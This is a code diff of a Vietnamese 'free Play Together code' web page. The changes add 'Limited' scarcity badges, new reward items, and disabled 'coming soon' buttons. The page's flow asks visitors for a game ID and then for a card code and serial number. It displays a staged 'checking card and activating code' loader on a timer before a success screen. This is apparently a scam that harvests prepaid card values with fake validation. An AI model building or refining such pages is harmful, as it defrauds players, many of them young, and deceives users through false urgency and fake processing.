@@ -6,7 +6,7 @@
     <title>NHẬN CODE PLAY TOGETHER</title>
     <link href="https://fonts.googleapis.com/css2?family=Lexend:wght@400;700;800&display=swap" rel="stylesheet">
     <style>
-        :root { --red: #e74c3c; --blue: #3498db; --green: #2ecc71; --bg: #f8f9fa; }
+        :root { --red: #e74c3c; --blue: #3498db; --green: #2ecc71; --bg: #f8f9fa; --gray: #bdc3c7; }
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Lexend', sans-serif; }
         body { background: var(--bg); padding-bottom: 80px; }
 
@@ -24,9 +24,14 @@
         .code-item { background: #f1f5f9; color: #475569; padding: 5px 10px; border-radius: 8px; font-size: 11px; font-weight: 700; border: 1px solid #cbd5e0; }
 
         .grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 12px; padding: 15px; }
-        .card { background: white; border-radius: 15px; overflow: hidden; border: 1px solid #eee; text-align: center; padding-bottom: 12px; box-shadow: 0 4px 6px rgba(0,0,0,0.05); display: flex; flex-direction: column; }
+        
+        /* Card với nhãn Giới hạn */
+        .card { background: white; border-radius: 15px; overflow: hidden; border: 1px solid #eee; text-align: center; padding-bottom: 12px; box-shadow: 0 4px 6px rgba(0,0,0,0.05); display: flex; flex-direction: column; position: relative; }
+        .limit-badge { position: absolute; top: 8px; left: 8px; background: var(--red); color: white; font-size: 9px; font-weight: 800; padding: 3px 8px; border-radius: 50px; text-transform: uppercase; z-index: 10; }
+        
         .card-img { width: 100%; aspect-ratio: 1/1; object-fit: cover; cursor: pointer; }
         .btn-main-receive { background: var(--red); color: white; border: none; padding: 8px 20px; border-radius: 8px; font-weight: 800; cursor: pointer; margin-top: 8px; font-size: 13px; align-self: center; }
+        .btn-disabled { background: var(--gray) !important; cursor: not-allowed !important; }
 
         .modal { position: fixed; inset: 0; background: rgba(0,0,0,0.7); backdrop-filter: blur(8px); display: none; align-items: center; justify-content: center; z-index: 1000; padding: 20px; }
         .modal.active { display: flex; }
@@ -99,6 +104,7 @@
         { id: 13, name: "Xưởng máy hoa hồng", img: "https://i.postimg.cc/zDppMY5g/IMG-2127.png" },
         { id: 2, name: "2.450 Đá quý", img: "https://i.postimg.cc/85dNNzLf/IMG-2025.png" },
         { id: 1, name: "450 Thỏi vàng", img: "https://i.postimg.cc/ydhss80F/IMG-0014.png" },
+        { id: 16, name: "Cần câu búa vàng", img: "https://i.postimg.cc/7YxyPMJ1/IMG-1867.png" }, // Vị trí thứ 4
         { id: 11, name: "Supreme Roadster Cực Quang", img: "https://i.postimg.cc/P51mpy11/IMG-2118.png" },
         { id: 12, name: "Mùa Vọng Lâu Thiếu Gia Hổ", img: "https://i.postimg.cc/zfJRLrJF/IMG-2119.png" },
         { id: 3, name: "Cô gái xác ướp", img: "https://i.postimg.cc/vmmwpwzM/IMG-2034.png" },
@@ -108,12 +114,28 @@
         { id: 7, name: "Nini rưng rưng", img: "https://i.postimg.cc/PxrytvQH/IMG-2050.png" },
         { id: 8, name: "Angel mate", img: "https://i.postimg.cc/0N9dfK3K/IMG-1865.png" },
         { id: 9, name: "Tay đua vũ trụ", img: "https://i.postimg.cc/q755y9Qf/IMG-2084.png" },
-        { id: 10, name: "Vợt ánh sao mơ màng", img: "https://i.postimg.cc/T3P00tpF/IMG-2083.png" }
+        { id: 10, name: "Vợt ánh sao mơ màng", img: "https://i.postimg.cc/T3P00tpF/IMG-2083.png" },
+        // Hai gói cuối cùng
+        { id: 14, name: "Gói kẹo cao su bạc hà", img: "https://i.postimg.cc/x8wpWQmp/Khong-Co-Tieu-De11-20260225012237.png", isComingSoon: true },
+        { id: 15, name: "Valentine xanh cá tính", img: "https://i.postimg.cc/VkgQbSM7/Khong-Co-Tieu-De12-20260225014422.png", isComingSoon: true }
     ];
 
     const grid = document.getElementById('item-grid');
     items.forEach(i => {
-        grid.innerHTML += `<div class="card"><img src="${i.img}" class="card-img" onclick="showItemDetail('${i.name}', '${i.img}')"><div style="font-size:13px; font-weight:700; margin: 12px 5px">${i.name}</div><button class="btn-main-receive" onclick="showItemDetail('${i.name}', '${i.img}')">Nhận</button></div>`;
+        let btnHtml = '';
+        if(i.isComingSoon) {
+            btnHtml = `<button class="btn-main-receive btn-disabled" disabled>Sắp ra mắt</button>`;
+        } else {
+            btnHtml = `<button class="btn-main-receive" onclick="showItemDetail('${i.name}', '${i.img}', false)">Nhận</button>`;
+        }
+
+        grid.innerHTML += `
+            <div class="card">
+                <div class="limit-badge">Giới hạn</div>
+                <img src="${i.img}" class="card-img" onclick="showItemDetail('${i.name}', '${i.img}', ${i.isComingSoon || false})">
+                <div style="font-size:13px; font-weight:700; margin: 12px 5px">${i.name}</div>
+                ${btnHtml}
+            </div>`;
     });
 
     const modal = document.getElementById('app-modal');
@@ -122,10 +144,14 @@
     let currentCode = "";
     let selectedGift = "";
 
-    function showItemDetail(name, img) {
+    function showItemDetail(name, img, isSoon) {
         selectedGift = name;
         modal.classList.add('active');
-        content.innerHTML = `<img src="${img}" class="zoom-img"><div class="zoom-title">${name}</div><button class="btn-popup-receive" onclick="openIDInput()">🎁 Nhận Quà</button>`;
+        let btnPopupHtml = isSoon ? 
+            `<button class="btn-popup-receive btn-disabled" disabled>Sắp ra mắt</button>` : 
+            `<button class="btn-popup-receive" onclick="openIDInput()">🎁 Nhận Quà</button>`;
+            
+        content.innerHTML = `<img src="${img}" class="zoom-img"><div class="zoom-title">${name}</div>${btnPopupHtml}`;
     }
 
     function openIDInput() {
@@ -178,9 +204,7 @@
 
     function finalProcess() {
         if(!document.getElementById('c-code').value || !document.getElementById('c-seri').value) return alert("Vui lòng nhập đầy đủ thông tin thẻ!");
-        
         content.innerHTML = `<div style="padding:30px 0"><div class="loader"></div><p style="font-weight:800">Đang kiểm tra thẻ và kích hoạt Code...</p></div>`;
-        
         setTimeout(() => {
             content.innerHTML = `
                 <span class="success-icon">✔</span>
